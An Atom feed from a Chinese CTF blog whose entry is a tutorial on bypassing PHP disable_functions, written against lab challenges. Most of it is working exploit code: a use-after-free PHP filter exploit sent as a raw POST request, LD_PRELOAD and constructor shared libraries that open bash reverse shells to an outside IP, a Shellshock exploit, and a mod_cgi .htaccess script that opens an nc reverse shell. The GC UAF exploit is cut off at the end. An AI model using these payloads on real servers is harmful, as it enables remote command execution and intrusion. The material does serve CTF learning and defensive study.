<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1__/\/のblog</title>
  
  <subtitle>LN</subtitle>
  <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
  
  <link href="http://lll-nnn.github.io/"/>
  <updated>2022-04-15T14:07:27.529Z</updated>
  <id>http://lll-nnn.github.io/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Bypass_disable_function</title>
    <link href="http://lll-nnn.github.io/2022/04/15/bypass-disable-function/"/>
    <id>http://lll-nnn.github.io/2022/04/15/bypass-disable-function/</id>
    <published>2022-04-14T16:35:51.000Z</published>
    <updated>2022-04-15T14:07:27.529Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>拿到<code>phpinfo</code>后需要关注的对象</p><p><code>PHP Variables</code></p><blockquote><p>比如<code>$_SERVER[&#39;PATH&#39;]</code>获取系统环境变量</p><p><code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code>获取网站路径</p></blockquote><p><code>open_basedir</code></p><p><code>PHP Version 7.2.9</code></p><p><code>disable_functions</code></p><p><code>allow_url_include</code></p><p><code>allow_url_fopen</code></p><p><code>auto_append_file</code></p><p><code>auto_prepend_file</code></p><p><code>short_open_tag</code></p><blockquote><p>决定是否允许使用 PHP 代码开始标志的缩写形式（<code>&lt;? ?&gt;</code>）。</p><p>本指令不会影响到缩写形式 <code>&lt;?=</code>，因为它总是可用的。</p></blockquote><h2 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h2><p><code>https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</code></p><p>一句话改为<code>POST</code>传值<code>?exp=eval($_POST[1]);</code>，构造表单</p><pre><code>POST /?exp=eval($_POST[1]); HTTP/1.1Host: 7c04b880-d3fb-4428-b036-3b2c06f5ae68.node4.buuoj.cn:81Content-Length: 6915Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;pwn(&#39;whoami&#39;);function pwn($cmd) &#123;    define(&#39;LOGGING&#39;, false);    define(&#39;CHUNK_DATA_SIZE&#39;, 0x60);    define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);    define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);    define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1);    define(&#39;CMD&#39;, $cmd);    for($i = 0; $i &lt; 10; $i++) &#123;        $groom[] = Pwn::alloc(STRING_SIZE);    &#125;    stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;);    $fd = fopen(&#39;php://memory&#39;, &#39;w&#39;);    stream_filter_append($fd,&#39;pwn_filter&#39;);    fputs($fd, &#39;x&#39;);&#125;class Helper &#123; public $a, $b, $c; &#125;class Pwn extends php_user_filter &#123;    private $abc, $abc_addr;    private $helper, $helper_addr, $helper_off;    private $uafp, $hfp;    public function filter($in, $out, &amp;$consumed, $closing) &#123;        if($closing) return;        stream_bucket_make_writeable($in);        $this-&gt;filtername = Pwn::alloc(STRING_SIZE);        fclose($this-&gt;stream);        $this-&gt;go();        return PSFS_PASS_ON;    &#125;    private function go() &#123;        $this-&gt;abc = &amp;$this-&gt;filtername;        $this-&gt;make_uaf_obj();        $this-&gt;helper = new Helper;        $this-&gt;helper-&gt;b = function($x) &#123;&#125;;        $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;        $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr);        $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE;        $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr);        $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;        $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE);        $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);        $this-&gt;prepare_leaker();        $binary_leak = $this-&gt;read($helper_handlers + 8);        $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak);        $this-&gt;prepare_cleanup($binary_leak);        $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off + 0x38);        $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr);        $closure_ce = $this-&gt;read($closure_addr + 0x10);        $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);        $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);        $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);        $zif_system = $this-&gt;get_system($basic_funcs);        $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system);        $fake_closure_off = $this-&gt;helper_off + CHUNK_SIZE * 2;        for($i = 0; $i &lt; 0x138; $i += 8) &#123;            $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));        &#125;        $this-&gt;write($fake_closure_off + 0x38, 1, 4);        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;        $this-&gt;write($fake_closure_off + $handler_offset, $zif_system);        $fake_closure_addr = $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off;        $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr);        $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);        $this-&gt;cleanup();        ($this-&gt;helper-&gt;b)(CMD);    &#125;    private function make_uaf_obj() &#123;        $this-&gt;uafp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE));        for($i = 0; $i &lt; STRING_SIZE; $i++) &#123;            fputs($this-&gt;uafp, &quot;\x00&quot;);        &#125;    &#125;    private function prepare_leaker() &#123;        $str_off = $this-&gt;helper_off + CHUNK_SIZE + 8;        $this-&gt;write($str_off, 2);        $this-&gt;write($str_off + 0x10, 6);        $val_off = $this-&gt;helper_off + 0x48;        $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8);        $this-&gt;write($val_off + 8, 0xA);    &#125;    private function prepare_cleanup($binary_leak) &#123;        $ret_gadget = $binary_leak;        do &#123;            --$ret_gadget;        &#125; while($this-&gt;read($ret_gadget, 1) !== 0xC3);        $this-&gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget);        $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));        $this-&gt;write(8, $ret_gadget);    &#125;    private function read($addr, $n = 8) &#123;        $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10);        $value = strlen($this-&gt;helper-&gt;c);        if($n !== 8) &#123; $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;        return $value;    &#125;    private function write($p, $v, $n = 8) &#123;        for($i = 0; $i &lt; $n; $i++) &#123;            $this-&gt;abc[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    private function get_basic_funcs($addr) &#123;        while(true) &#123;            // In rare instances the standard module might lie after the addr we&#39;re starting            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.            // In that case, changing the direction of the search should fix the crash.            // $addr += 0x10;            $addr -= 0x10;            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;                in_array($this-&gt;read($addr + 4, 4),                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) &#123;                $module_name_addr = $this-&gt;read($addr + 0x20);                $module_name = $this-&gt;read($module_name_addr);                if($module_name === 0x647261646e617473) &#123;                    $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr);                    return $this-&gt;read($addr + 0x28);                &#125;            &#125;        &#125;    &#125;    private function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = $this-&gt;read($addr);            $f_name = $this-&gt;read($f_entry, 6);            if($f_name === 0x6d6574737973) &#123;                return $this-&gt;read($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry !== 0);    &#125;    private function cleanup() &#123;        $this-&gt;hfp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;hfp, pack(&#39;QQ&#39;, 0, $this-&gt;abc_addr));        for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i++) &#123;            fputs($this-&gt;hfp, &quot;\x00&quot;);        &#125;    &#125;    private function str2ptr($p = 0, $n = 8) &#123;        $address = 0;        for($j = $n - 1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($this-&gt;abc[$p + $j]);        &#125;        return $address;    &#125;    private function ptr2str($ptr, $n = 8) &#123;        $out = &#39;&#39;;        for ($i = 0; $i &lt; $n; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    private function log($format, $val = &#39;&#39;) &#123;        if(LOGGING) &#123;            printf(&quot;&#123;$format&#125;\n&quot;, $val);        &#125;    &#125;    static function alloc($size) &#123;        return str_shuffle(str_repeat(&#39;A&#39;, $size));    &#125;&#125;------WebKitFormBoundaryj28zfvoWVxnHdp29--</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150034118.png"></p><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><pre><code class="hljs c"><span class="hljs-comment">//exp2.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;     system(<span class="hljs-string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/120.76.136.64/2233 &lt;&amp;1&#x27;&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">geteuid</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;     <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>)    &#123;         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     &#125;    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>); payload();&#125;</code></pre><p>编译<code>exp2.c</code>为<code>.so</code></p><p><code>gcc exp2.c -o payload.so -shared -fPIC</code></p><blockquote><p><code>-shared</code>创建一个动态链接库，输入文件可以是源文件、汇编文件、目标文件</p><p><code>-fPIC</code> 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</p></blockquote><p>上传so文件</p><pre><code class="hljs shell">POST /uploads/318a654260f9e6f122c9bd8b425fe47b.php HTTP/1.1Host: 255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Length: 77Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36Origin: http://255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81/uploads/318a654260f9e6f122c9bd8b425fe47b.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: __gads=ID=ff563d10420b0338-2258e7c799ca00cd:T=1627650787:RT=1627650787:S=ALNI_MbFtePzSmcYwzN2fcIiRk_sifUfpAConnection: close1=<span class="hljs-meta">$</span><span class="bash">url = <span class="hljs-string">&quot;http://xxx.xx.xx.xx/aa.so&quot;</span>;</span><span class="hljs-meta">$</span><span class="bash">file1 = new SplFileObject(<span class="hljs-variable">$url</span>,<span class="hljs-string">&#x27;r&#x27;</span>);</span><span class="hljs-meta">$</span><span class="bash">a=<span class="hljs-string">&quot;&quot;</span>;</span>while(!$file1-&gt;eof())&#123;    $a=$a.$file1-&gt;fgets();&#125;<span class="hljs-meta">$</span><span class="bash">file2 = new SplFileObject(<span class="hljs-string">&#x27;aa.so&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);</span><span class="hljs-meta">$</span><span class="bash">file2-&gt;fwrite(<span class="hljs-variable">$a</span>);</span></code></pre><p>命令执行</p><p><code>1=putenv(&quot;LD_PRELOAD=/var/www/html/uploads/aa.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</code></p><p>如果<code>mail()</code>被禁，可以换成<code>error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;)</code></p><blockquote><p><code>LD_PRELOAD</code>是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p><p><code>putenv()</code>用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在,则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p></blockquote><p><code>mail()</code>函数会执行<code>/usr/sbin/sendmail</code>,<code>LD_PRELOAD</code>可以优先加载链接库，库中重写<code>sendmail</code>影响的函数，这样<code>mail</code>后就会执行我们重写后的函数；如果系统中没有<code>sendmail</code>,<code>GCC</code> 有个 C 语言扩展修饰符<br><code> attribute((constructor))</code>，可以让由它修饰的函数在 <code>main() </code>之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor))<br> 修饰的函数。</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">angel</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);    system(<span class="hljs-string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/120.76.136.64/2233 &lt;&amp;1&#x27;&quot;</span>);&#125;</code></pre><h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><p>编译</p><p>上传<code>.so</code>和<code>gconv-modules</code></p><p>命令执行</p><p><code>1=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code></p><h2 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h2><p>利用bash破壳漏洞（<code>CVE-2014-6271</code>），该漏洞存在于<code>bash 1.14 – 4.3</code>版本中<br><a href="https://www.cnblogs.com/qmfsun/p/7591757.html">https://www.cnblogs.com/qmfsun/p/7591757.html</a></p><p>导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令</p><p><code>putenv(&quot;HACK=() &#123; :; &#125;; /bin/ls&quot;);error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</code><br> 利用的PHP代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><span class="hljs-comment"># Google Dork: none </span><span class="hljs-comment"># Date: 10/31/2014 </span><span class="hljs-comment"># Exploit Author: Ryan King (Starfall) </span><span class="hljs-comment"># Vendor Homepage: http://php.net </span><span class="hljs-comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><span class="hljs-comment"># Version: 5.* (tested on 5.6.2) </span><span class="hljs-comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><span class="hljs-comment"># CVE: CVE-2014-6271 </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params">$cmd</span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   $tmp = tempnam(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>);    putenv(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$cmd</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>);    <span class="hljs-comment">// In Safe Mode, the user may only alter environment variableswhose names </span>   <span class="hljs-comment">// begin with the prefixes supplied by this directive. </span>   <span class="hljs-comment">// By default, users will only be able to set environment variablesthat </span>   <span class="hljs-comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="hljs-doctag">Note:</span> if this directive isempty, </span>   <span class="hljs-comment">// PHP will let the user modify ANY environment variable! </span>   <span class="hljs-comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span>   error_log(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);   $output = @file_get_contents($tmp);    @unlink($tmp);    <span class="hljs-keyword">if</span>($output != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> $output;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; &#125; <span class="hljs-keyword">echo</span> shellshock($_REQUEST[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></code></pre><p>上传运行</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150033034.png"></p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p><code>前置知识</code></p><p><code>.htaccess</code></p><blockquote><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>当AllowOverride被设置为None时。不搜索该目录下的.htaccess文件</p><p>All: 在.htaccess文件中可以使用所有的指令</p><p><code>.htaccess</code>文件中的配置指令作用于<code>.htaccess</code>文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有<code>.htaccess</code>文件，而指令是按查找顺序依次生效的，所以一个特定目录下的<code>.htaccess</code>文件中的指令可能会覆盖其上级目录中的<code>.htaccess</code>文件中的指令，即<code>子目录中的指令会覆盖父目录或者主配置文件中的指令</code>。</p></blockquote><p><code>mod_cgi</code></p><blockquote><p>在非线程型MPM(<code>prefork</code>)上提供对CGI脚本执行的支持</p><p>任何具有MIME类型<code>application/x-httpd-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由<code>AddType</code>指令定义的扩展名，另一种是文件位于<code>ScriptAlias</code>目录中</p></blockquote><p><code>利用条件</code></p><blockquote><p>apache环境</p><p>mod_cgi启用</p><p>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</p><blockquote><p> 在ctfhub这道题中的<code>apache2.conf</code>中是这样的配置，AllowOverride 是None,但有<code>AccessFileName</code></p><p> &lt;Directory /var/www/&gt;<br>     Options Indexes FollowSymLinks<br>     AllowOverride None<br>     Require all granted<br> </Directory></p><p> AccessFileName .htaccess</p></blockquote><p>目录有写权限</p></blockquote><p>蚁剑插件一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150033846.png"></p><p>会自动写入</p><p><code>.htaccess</code></p><blockquote><p>Options +ExecCGI<br>AddHandler cgi-script .ant</p></blockquote><blockquote><p>ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本</p></blockquote><p><code>.htaccess.bak</code></p><blockquote><p>SetEnv HTACCESS on</p></blockquote><p><code>shell.ant</code></p><blockquote><p>#!/bin/sh<br>echo&amp;&amp;cd “/“;/readflag;echo 59dd086;pwd;echo 3530879</p></blockquote><p><code>exp</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$cmd = <span class="hljs-string">&quot;nc -c &#x27;/bin/bash&#x27; 10.11.12.13 8888&quot;</span>; <span class="hljs-comment">//command to be executed</span>$shellfile = <span class="hljs-string">&quot;#!/bin/bash\n&quot;</span>; <span class="hljs-comment">//using a shellscript</span>$shellfile .= <span class="hljs-string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span>$shellfile .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params">$text,$condition,$yes,$no</span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . ($condition ? $yes : $no) . <span class="hljs-string">&quot;&lt;br&gt;\n&quot;</span>;&#125;<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;checked&#x27;</span>]))&#123;    @file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span>    header(<span class="hljs-string">&#x27;Location: &#x27;</span> . $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span>&#125;<span class="hljs-keyword">else</span>&#123;    $modcgi = in_array(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, apache_get_modules()); <span class="hljs-comment">// mod_cgi enabled?</span>    $writable = is_writable(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span>    $htaccess = !<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span>        checkEnabled(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>,$modcgi,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);        checkEnabled(<span class="hljs-string">&quot;Is writable&quot;</span>,$writable,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);        checkEnabled(<span class="hljs-string">&quot;htaccess working&quot;</span>,$htaccess,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);    <span class="hljs-keyword">if</span>(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))    &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span>    &#125;    <span class="hljs-keyword">else</span>    &#123;        checkEnabled(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>,copy(<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.htaccess.bak&quot;</span>),<span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span>        checkEnabled(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span>        checkEnabled(<span class="hljs-string">&quot;Write shell file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>,$shellfile),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span>        checkEnabled(<span class="hljs-string">&quot;Chmod 777&quot;</span>,chmod(<span class="hljs-string">&quot;shell.dizzle&quot;</span>,<span class="hljs-number">0777</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span>    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p><code>PHP-FPM</code></p><blockquote><p><code>PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)</code>是一个PHPFastCGI管理器，对于PHP 5.3.3之前的php来说，是一个补丁包  ，旨在将FastCGI进程管理整合进PHP包中</p><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p></blockquote><p><a href="https://www.leavesongs.com/penetration/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p><p><a href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true">https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true</a></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150032004.png"></p><p>蚁剑插件一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150032612.png"></p><p>成功的话会在在<code>/tmp</code>目录上传<code>.33997ant_x64.so</code>文件，在<code>/var/www/html</code>中生成<code>.antproxy.php</code>文件，重新以这个文件作为webshell连接，就能bypass了</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150032234.png"></p><h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p>此漏洞利用PHP垃圾收集器（garbage collector）中存在三年的一个 bug，通过PHP垃圾收集器中堆溢出来绕过disable_functions并执行系统命令。</p><p><code>exp.php</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><span class="hljs-comment">#</span><span class="hljs-comment"># <span class="hljs-doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span><span class="hljs-comment">#</span><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.3 versions</span><span class="hljs-comment">#</span><span class="hljs-comment"># Author: https://github.com/mm0r1</span>pwn(<span class="hljs-string">&quot;uname -a&quot;</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">$cmd</span>) </span>&#123;    <span class="hljs-keyword">global</span> $abc, $helper;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;$str, $p = <span class="hljs-number">0</span>, $s = <span class="hljs-number">8</span></span>) </span>&#123;        $address = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>($j = $s<span class="hljs-number">-1</span>; $j &gt;= <span class="hljs-number">0</span>; $j--) &#123;            $address &lt;&lt;= <span class="hljs-number">8</span>;            $address |= ord($str[$p+$j]);        &#125;        <span class="hljs-keyword">return</span> $address;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params">$ptr, $m = <span class="hljs-number">8</span></span>) </span>&#123;        $out = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $m; 